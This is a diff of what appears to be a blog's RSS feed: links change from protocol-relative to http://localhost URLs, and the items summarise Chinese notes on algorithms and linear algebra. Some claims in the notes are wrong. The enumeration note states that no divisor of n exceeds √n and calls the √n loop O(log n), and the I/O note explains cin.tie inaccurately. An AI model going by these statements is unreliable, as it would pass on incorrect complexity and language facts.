       <description>算法筆記目錄 基礎資料結構 我們程式想儲存東西有很多種方式，而資料結構就像一種容器，&#xA;可以儲存或拿取需要的東西，每種資料結構都有不同的複雜度，&#xA;如果用得好，效率就會高。&#xA;以下都是最基本的資料結構&#xA;1.Vector - 向量 in &amp;lt;vector&amp;gt; 1 vector&amp;lt;int&amp;gt; v; 向量可當成陣列來用，應該說它就是更強的陣列，而且易維護。&#xA;比起原本陣列，它可以自動擴大容量，&#xA;能用的空間也比陣列還多。但要注意的是，如果使用operator[]存取了未配置的記憶體位置，&#xA;會導致Segmentation Fault。&#xA;以下為vector的功能： -- vector[n] 存取索引值為n的元素 -- vector.at(n) 存取索引值為n的元素(較安全) -- vector.begin() 回傳指向vector第一個元素的疊代器 -- vector.end() 回傳指向vector最後一個元素再下一個的疊代器 -- vector.front() 回傳vector[0] -- vector.back() 回傳vector最後一個元素的值 -- vector.size() 回傳目前vector儲存了多少元素 -- vector.resize(n) 修改vector大小 -- vector.capacity() 存取可容納最大個數 -- vector.empty() 回傳布林值表示vector是不是空的 -- vector.reserve(n) 配置更多記憶體以容納更多元素 -- vector.push_back(n) 把n放到vector最尾端 -- vector.pop_back() 把vector最尾端元素取出 -- vector.insert(it,n) 在疊代器it後插入元素n -- vector.erase(it,(it2)) 刪除疊代器it~it2的元素 -- vector.clear() 刪除所有元素 -- vector.</description>
     </item>
     <item>
       <title>算法筆記-常數優化</title>
-      <link>//localhost:1313/posts/1/algo-io/</link>
+      <link>http://localhost:1313/posts/1/algo-io/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>//localhost:1313/posts/1/algo-io/</guid>
+      <guid>http://localhost:1313/posts/1/algo-io/</guid>
       <description>算法筆記目錄 編譯器優化 我們的程式變成執行檔時需要經過一連串的轉譯與運算，&#xA;如果改變編譯器的編譯模式，或者改變寫程式的習慣，有可能會讓效率變更高。&#xA;一般的Judge編譯器模式都是O2，是個比較安全的運算方式。&#xA;但其實我們可以在程式中再加入一些指令，改變編譯器的運算方式。&#xA;1 2 3 4 5 6 #pragma GCC optimize(&amp;#34;Ofast&amp;#34;) //以較不安全的運算來編譯程式 #pragma loop_opt(on) //迴圈優化 #pragma comment(linker,&amp;#34;/stack:200000000&amp;#34;) //更改最大堆疊數 以上是我常用的編譯器優化指令，&#xA;請注意不是所有OJ都支援pragma優化。&#xA;I/O優化 當我們比較cout、cin與printf、scanf時，會發現後者比前者快非常多。&#xA;這是因為每次在輸入輸出前，程式會將資料放進一個緩衝區(內存)，然後再從內存裡拿出。&#xA;我們應該減少拿取的動作，因為這非常耗時。&#xA;如果做過CF互動題，會發現題目會要求在輸出後加上cout.flush()，就是要把資料強制輸出，&#xA;否則它可能要等到程式結束後才輸出。&#xA;cin，它的原理其實是讀取鍵盤輸入的字，再輸出給使用者看打了什麼，&#xA;這就讓拿取的動作暴增了，解決方法是加上 cin.tie(0);&#xA;讓內存強制釋放掉。&#xA;C++有兩種輸出輸入，分別是stdio與iostream，而程式可能會搞混而發生問題&#xA;，使得效率變差，這時就加上 ios_base::sync_with_stdio(false); 就解決了&#xA;加上這行後，之後的輸入輸出就是選(cin,cout)或(scanf,printf)其中一個，&#xA;絕對不要再混用。&#xA;C++的換行可以是endl或&amp;rsquo;\n&amp;rsquo;，而其實 cout &amp;lt;&amp;lt; endl 相當於 cout &amp;lt;&amp;lt; &#39;\n&#39; &amp;lt;&amp;lt; flush&#xA;也就是它順便把內存清空了，做了多餘的動作。&#xA;之後記得要換行的話就用&amp;rsquo;\n&amp;rsquo;別再用endl了。 或放個 #define endl &#39;\n&#39;</description>
     </item>
     <item>
       <title>算法筆記-排序</title>
-      <link>//localhost:1313/posts/1/algo-sorting/</link>
+      <link>http://localhost:1313/posts/1/algo-sorting/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>//localhost:1313/posts/1/algo-sorting/</guid>
+      <guid>http://localhost:1313/posts/1/algo-sorting/</guid>
       <description>算法筆記目錄 排序 排序是將一串資料依優先度排列，是電腦工程最常見且最基本的算法，將資料排序後，可以更有效率的搜尋資料，也可以更有效率的處理資料，利於統計。&#xA;氣泡排序(Bubble Sort) 氣泡排序通常是我們在學校會學到的第一種排序法，原因是其簡單易懂，&#xA;原理是逐一比較相鄰兩元素，若順序錯誤則交換。&#xA;每一輪都確保最後一筆資料在正確的位置。&#xA;因此我們需要跑好幾輪，直到整個數組都是正確的順序。&#xA;如果數組長度為 $n$，則需要跑 $n-1$ 輪、每輪跑 $n-i$ 次，總共跑 $n(n-1)/2$ 次。&#xA;因此時間複雜度為 $O(n^2)$。&#xA;1 2 3 4 5 6 7 8 9 void bubbleSort(int arr[], int n) { for (int i = 0; i &amp;lt; n - 1; i++) { for (int j = 0; j &amp;lt; n - i - 1; j++) { if (arr[j] &amp;gt; arr[j + 1]) { swap(arr[j], arr[j + 1]); } } } } 然而氣泡排序法的時間複雜度太高了(成本太高)，如果資料達到數百萬筆就不適合使用此排序法。</description>
     </item>
     <item>
       <title>算法筆記-數論</title>
-      <link>//localhost:1313/posts/1/algo-number-theory/</link>
+      <link>http://localhost:1313/posts/1/algo-number-theory/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>//localhost:1313/posts/1/algo-number-theory/</guid>
+      <guid>http://localhost:1313/posts/1/algo-number-theory/</guid>
       <description>算法筆記目錄 什麼是數論 數學的分支，專門研究整數的性質。&#xA;模運算 同餘 $a \equiv b \pmod n $ 表示 $n\ |\ (a-b)$ ( $n$ 整除 $a-b$ )，稱 $a$ 與 $b$ 模 $n$ 同餘。&#xA;比如&#xA;7 除以 3 餘 1&#xA;10 除以 3 餘 1&#xA;則可以說 $7 \equiv 10 \pmod 3$&#xA;證明: 對於 $a \equiv b \pmod k $&#xA;令 $a = ks + r,\ b = kt + r$&#xA;兩式相減得 $a-b = k(s-t)$&#xA;證明結束&#xA;加乘法性質 如果 $a \equiv b \pmod n $, $c \equiv d \pmod n $</description>
     </item>
     <item>
       <title>算法筆記-時間複雜度概述</title>
-      <link>//localhost:1313/posts/1/algo-runtime/</link>
+      <link>http://localhost:1313/posts/1/algo-runtime/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>//localhost:1313/posts/1/algo-runtime/</guid>
+      <guid>http://localhost:1313/posts/1/algo-runtime/</guid>
       <description>算法筆記目錄 時間複雜度在競程中是個非常重要且最基本的工具，&#xA;係用於估算程式執行N次，大概需要花多久時間。&#xA;我們在程式中做的任何事情可能都需要花費1單位時間，&#xA;比如五則運算、條件判斷、變數存賦等。&#xA;而我們通常會使用函式$O(Big-O)$ 來表示程式的複雜度。&#xA;對於$O()$，有以下定義：&#xA;$$ Def:\&#xA;\qquad&#x9;If\ f(x) = O(g(x)),\ ∃M,x_0 &amp;gt; 0,\ such \ that \ ∀x&amp;gt;=x_0,then \ |f(x)| &amp;lt;= M|g(x)| $$&#xA;為什麼我們需要估時間複雜度？&#xA;因為我們在寫程式追求的是速度！當你的演算法太慢(時間複雜度太大)時，&#xA;就算結果是對的，但你會在Online Judge上或APCS得到一個TLE(Time Limit Exceeded)，&#xA;即若將測資丟到你的程式，會超出該題目所規定的執行時間。&#xA;要如何估自己的程式會跑幾秒？&#xA;通常，Judge的執行速度大約是1e8筆/秒，因此只要將題目的範圍限制代入所估複雜度，&#xA;然後除以1e8，就能大概知道自己程式會不會TLE了。&#xA;常見的複雜度有： $1,n,n^2,n^3,nlogn,2^n$。 而log通常以2為底但我們不太會去明指以誰為底。&#xA;以下是複雜度計算的原則：&#xA;&amp;ndash; 1.常數倍數不計( $O(2n) = O(n) = O(3n)$ )。&#xA;&amp;ndash; 2.若將程式分成兩段複雜度為$O(f(n)),\ O(g(n))$,總複雜度就取複雜度比較大的那段。&#xA;即$O(f(n)+g(n)) = O(f(n)) &amp;gt; O(g(n)) ? O(f(n)) : O(g(n))$&#xA;&amp;ndash; 3.若有一段程式複雜度為$O(f(n))$執行$g(n)$次，總複雜度是$O(f(n)*g(n))$。</description>
     </item>
     <item>
       <title>算法筆記-枚舉與搜尋</title>
-      <link>//localhost:1313/posts/1/algo-enum-and-searching/</link>
+      <link>http://localhost:1313/posts/1/algo-enum-and-searching/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>//localhost:1313/posts/1/algo-enum-and-searching/</guid>
+      <guid>http://localhost:1313/posts/1/algo-enum-and-searching/</guid>
       <description>算法筆記目錄 枚舉與搜尋 枚舉(Enumeration) 枚舉，就是把全部或部分可能的情況都列出來，然後一個一個檢查是否符合條件，又稱窮舉。&#xA;雖然枚舉通常沒辦法在短時間內解決整個問題，但可以透過解決小問題來找到大問題的規律，或是用於檢驗時間複雜度較低的做法是否正確。&#xA;例題一 給一正整數 $n$，求 $n$ 的所有因數。&#xA;我們枚舉所有不超過 $n$ 的正整數，檢查每個數字是否為 $n$ 的因數，時間複雜度為 $O(n)$。&#xA;1 2 3 4 5 6 7 long long n; cin &amp;gt;&amp;gt; n; for (long long i = 1; i &amp;lt;= n; i++) { if (n % i == 0) { cout &amp;lt;&amp;lt; i &amp;lt;&amp;lt; endl; } } 這個方法雖然確實可以求出所有因數，但效率不夠好，考慮 $n$ 的因數都不會超過 $\sqrt{n}$，所以我們只需要枚舉到 $\sqrt{n}$ 即可，時間複雜度 $O(log\ n)$。&#xA;1 2 3 4 5 6 7 8 9 10 long long n; cin &amp;gt;&amp;gt; n; for (long long i = 1; i * i &amp;lt;= n; i++) { if (n % i == 0) { cout &amp;lt;&amp;lt; i &amp;lt;&amp;lt; endl; if (i * i !</description>
     </item>
     <item>
       <title>算法筆記-目錄</title>
-      <link>//localhost:1313/posts/algo-index/</link>
+      <link>http://localhost:1313/posts/algo-index/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>//localhost:1313/posts/algo-index/</guid>
+      <guid>http://localhost:1313/posts/algo-index/</guid>
       <description> 時間複雜度概述 速度優化 排序 基礎資料結構 枚舉與二分搜尋 群論 數論 初階資料結構 貪心 </description>
     </item>
     <item>
       <title>算法筆記-群論</title>
-      <link>//localhost:1313/posts/1/algo-group-theory/</link>
+      <link>http://localhost:1313/posts/1/algo-group-theory/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>//localhost:1313/posts/1/algo-group-theory/</guid>
+      <guid>http://localhost:1313/posts/1/algo-group-theory/</guid>
       <description>算法筆記目錄 群 有一個集合 $G$ 和一個二元運算子 $\cdot$，滿足以下條件，就稱 $(G,\cdot)$ 構成一個群：&#xA;封閉性 對於 $G$ 中的任意兩個元素 $a,b$，都有 $a\cdot b\in G$。 結合性 對於 $G$ 中的任意三個元素 $a,b,c$，都有 $a\cdot (b\cdot c)=(a\cdot b)\cdot c$。 單位元 對於 $G$ 中的任意元素 $a$，都有存在一個元素 $e$，使得 $a\cdot e=a=e\cdot a$。 逆元 對於 $G$ 中的任意元素 $a$，都有存在一個元素 $a^{-1}$，使得 $a\cdot a^{-1}=a^{-1}\cdot a=e$。 以加法為例，$a,b,c \in \mathbb{Z} $，$a+b+c$ 滿足上述條件，因此 $(\mathbb{Z},+)$ 構成一個群。&#xA;而因為 $+$ 滿足結合性，所以我們在做運算時不需要加括號，如果 $+$ 運算都與同一元素有關，可以變成乘法，$a+a+a=3a$&#xA;注意到群沒有必要滿足交換性，而如果群滿足交換性，則稱為交換群或阿貝爾群。&#xA;加法的逆元是負號，乘法的逆元是倒數。&#xA;如果 $G$ 中存在一個元素 $g$ 使得對 $G$ 中的任意元素 $a$ 都有 $a = g^n $，則稱 $(G,\cdot)$ 為循環群，也說 $G$ 由 $g$ 生成、$g$ 是 $G$ 的生成元，記作 $G = \langle g \rangle$，其中 $\langle g \rangle$ 稱為 $g$ 的生成集合(Span)。</description>
     </item>
     <item>
       <title>算法筆記-貪心</title>
-      <link>//localhost:1313/posts/1/algo-greedy/</link>
+      <link>http://localhost:1313/posts/1/algo-greedy/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>//localhost:1313/posts/1/algo-greedy/</guid>
+      <guid>http://localhost:1313/posts/1/algo-greedy/</guid>
       <description>算法筆記目錄 貪心 貪心就是在每一步都選擇當下看起來最好的選擇，直到結束。&#xA;經典題如：換錢問題、排程問題都是貪心的典型題目。&#xA;在之後的圖論中如最小生成樹、最短路徑問題也都是利用貪心解。</description>
     </item>
     <item>
       <title>算法筆記-進階資料結構</title>
-      <link>//localhost:1313/posts/1/algo-advanced-structure/</link>
+      <link>http://localhost:1313/posts/1/algo-advanced-structure/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>//localhost:1313/posts/1/algo-advanced-structure/</guid>
+      <guid>http://localhost:1313/posts/1/algo-advanced-structure/</guid>
       <description>算法筆記目錄 進階資料結構 二元搜尋樹 某棵樹滿足以下條件可稱為二元搜尋樹&#xD;* 為一棵 Binary Tree&#xD;* 對任一節點 $i$，其左子樹所有值小於它，且右子樹所有值大於它&#xD;* 沒有鍵值相同的節點 實作 插入節點 如果 root 為空就填進去 跟 root 比較，如果比較小就往左，比較大就往右 搜尋 跟新增差不多，比較小往左，比較大往右，經過的時候順便檢查當前是否為搜尋目標&#xA;刪除節點 先找到要刪的節點&#xA;如果它沒有子節點，直接刪掉就好&#xA;如果它只有一個子節點，把該子節點跟親代節點連起來就好&#xA;如果它有兩個子節點，找到右子節點的最小值(或左子節點的最大值)替補上去就好。</description>
     </item>
     <item>
       <title>線性代數筆記-消去法</title>
-      <link>//localhost:1313/posts/LinearAlgebra/linear-elimination-methods/</link>
+      <link>http://localhost:1313/posts/LinearAlgebra/linear-elimination-methods/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>//localhost:1313/posts/LinearAlgebra/linear-elimination-methods/</guid>
+      <guid>http://localhost:1313/posts/LinearAlgebra/linear-elimination-methods/</guid>
       <description>線性代數筆記-目錄&#xA;上一篇-線性方程系統簡介&#xA;高斯消去法(Gaussian elimination) 梯形(Echelon form) 如果有以下性質，稱為簡化列梯形(reduced row-echeleon form)： 若該列並非全為 $0$，則該列第一個非零元素為 $1$(leading 1)。 若該列全為 $0$，則必須被放在矩陣的最下方。 對於連續兩個非零列，較低列的 leading 1 必須在較高列的 leading 1 的右邊。 每一行除了 leading 1 之外，其餘元素皆為 $0$。 如果只滿足前三項，稱為列梯形(row-echeleon form)。 簡化列梯形有列梯形的性質，但不一定相反。 以下為簡化列梯形的例子：&#xA;$ \begin{bmatrix} 1 &amp;amp; 0 &amp;amp; 0 &amp;amp; 0 \\ 0 &amp;amp; 1 &amp;amp; 0 &amp;amp; 0 \\ 0 &amp;amp; 0 &amp;amp; 1 &amp;amp; 0 \\ 0 &amp;amp; 0 &amp;amp; 0 &amp;amp; 1 \end{bmatrix} $ $ \begin{bmatrix} 1 &amp;amp; 0 &amp;amp; 0 &amp;amp; a \\ 0 &amp;amp; 1 &amp;amp; 0 &amp;amp; b \\ 0 &amp;amp; 0 &amp;amp; 1 &amp;amp; c \\ 0 &amp;amp; 0 &amp;amp; 0 &amp;amp; 0 \end{bmatrix} $</description>
     </item>
     <item>
       <title>線性代數筆記-目錄</title>
-      <link>//localhost:1313/posts/LinearAlgebra/linear-index/</link>
+      <link>http://localhost:1313/posts/LinearAlgebra/linear-index/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>//localhost:1313/posts/LinearAlgebra/linear-index/</guid>
+      <guid>http://localhost:1313/posts/LinearAlgebra/linear-index/</guid>
       <description> 線性方程系統簡介 消去法 矩陣與矩陣運算 </description>
     </item>
     <item>
       <title>線性代數筆記-矩陣與矩陣運算</title>
-      <link>//localhost:1313/posts/LinearAlgebra/linear-matrix-operations/</link>
+      <link>http://localhost:1313/posts/LinearAlgebra/linear-matrix-operations/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>//localhost:1313/posts/LinearAlgebra/linear-matrix-operations/</guid>
+      <guid>http://localhost:1313/posts/LinearAlgebra/linear-matrix-operations/</guid>
       <description>線性代數筆記-目錄&#xA;上一篇-消去法&#xA;矩陣與矩陣運算(Matrices and Matrix Operations) 定義與表示法 矩陣是一堆數字的矩形陣列，陣列中的數字稱為矩陣的元素(entry)。 一個 $m \times n$ 的矩陣，可表示為 $A = \begin{bmatrix} a_{11} &amp;amp; a_{12} &amp;amp; \cdots &amp;amp; a_{1n} \\ a_{21} &amp;amp; a_{22} &amp;amp; \cdots &amp;amp; a_{2n} \\ \vdots &amp;amp; \vdots &amp;amp; \ddots &amp;amp; \vdots \\ a_{m1} &amp;amp; a_{m2} &amp;amp; \cdots &amp;amp; a_{mn} \end{bmatrix}$。 也可寫成 $[a_{ij}]_{m \times n}$。 $a_{ij}$ 表為矩陣 $A$ 的第 $i$ 列第 $j$ 行的元素。 加減法 如果矩陣大小相同，則可進行加減法，將對應位置的元素相加減。 乘法 如果是純量乘上矩陣，則將矩陣中的每個元素乘上純量。 如果是 $A$ 是 $m \times r$ 矩陣，$B$ 是 $r \times n$ 矩陣，則 $AB$ 是 $m \times n$ 矩陣，$AB$ 的第 $i$ 列第 $j$ 行的元素為 $ \sum_{k=1}^r a_{ik}b_{kj}$。 換句話說， $AB$ 的第 $j$ 行 $ = A $ [ $B$ 的第 $j$ 行]， $AB$ 的第 $i$ 列 $ = $ [ $A$ 的第 $i$ 列] $B$。 如果 $A$ 與 $B$ 的大小不是如同 $m \times r$ 與 $r \times n $ 的形式，則$AB$不存在。 線性系統的矩陣形式 $$\begin{array}{} a_{11}x_1 + a_{12}x_2 + \cdots + a_{1n}x_n = b_1 \\ a_{21}x_1 + a_{22}x_2 + \cdots + a_{2n}x_n = b_2 \\ \vdots \\ a_{m1}x_1 + a_{m2}x_2 + \cdots + a_{mn}x_n = b_m\end{array}$$</description>
     </item>
     <item>
       <title>線性代數筆記-線性方程系統簡介</title>
-      <link>//localhost:1313/posts/LinearAlgebra/linear-intro/</link>
+      <link>http://localhost:1313/posts/LinearAlgebra/linear-intro/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>//localhost:1313/posts/LinearAlgebra/linear-intro/</guid>
+      <guid>http://localhost:1313/posts/LinearAlgebra/linear-intro/</guid>
       <description>線性代數筆記-目錄&#xA;注意：以下所有行(columns)、列(rows)的定義皆以台灣的表示法為主，即行為直向，列為橫向&#xA;線性方程式 線性方程式 在二維直角座標系中，一個直線方程式可表示為 $ax+by=c$ ($a$, $b$ 不全為 $0$)&#xA;而在三維直角座標系中，一個平面方程式可表示為 $ax+by+cz=d$ ($a$, $b$, $c$ 不全為 $0$)&#xA;所以我們可以將線性方程式一般化，為了表示 $n$ 維 ($n$ 個變數) 的線性方程式，&#xA;將 $n$ 個變數分別表示為 $x_1, x_2, \cdots, x_n$，並將 $n$ 個係數分別表示為 $a_1, a_2, \cdots, a_n$，&#xA;則 $n$ 維線性方程式可表示為 $a_1x_1+a_2x_2+\cdots+a_nx_n=c$ ($a_1, a_2, \cdots, a_n$ 不全為 $0$)&#xA;或是 $ \sum^n_{i=1} a_i x_i = c$。&#xA;如果 $c$ 為 $0$，$ \sum^n_{i=1} a_i x_i = 0$，稱為 $x_1, x_2, \cdots, x_n$ 的齊次線性方程式。&#xA;線性方程系統 線性方程系統 有限個數的線性方程式集合，稱為線性方程系統(system of linear equations)或線性系統(linear system)。</description>
     </item>
   </channel>
